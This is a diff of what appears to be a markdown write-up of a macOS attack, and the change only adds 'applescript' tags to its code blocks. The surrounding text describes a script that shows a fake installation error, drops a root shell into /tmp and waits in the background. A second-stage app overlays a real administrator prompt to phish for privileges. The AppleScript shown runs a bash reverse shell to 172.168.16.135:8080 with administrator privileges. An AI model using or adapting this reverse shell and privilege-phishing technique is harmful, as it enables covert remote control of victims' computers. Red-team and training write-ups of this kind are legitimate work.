@@ -51,7 +51,7 @@ The attacker tricks the victim into downloading and executing malicious software
 
 The script opens a metasploit shell, "fails installation" showing some innocent error message and drops the root shell into a temporary folder, and runs it as a background process where it waits silently until System Preferences is executed by the user.
 
-```
+```applescript
 
 --stage one
 tell application "HelpViewer"
@@ -70,7 +70,7 @@ do shell script "open /tmp/root.app"
 
 When root.app gets executed it overlays a legitimate administrator app and asks for administrator privileges as if it was the app asking:
 
-```
+```applescript
 
 -- stage 2
 do shell script "/bin/bash -i >& /dev/tcp/172.168.16.135/8080 0>&1 > /dev/null 2>&1 &" with administrator privileges
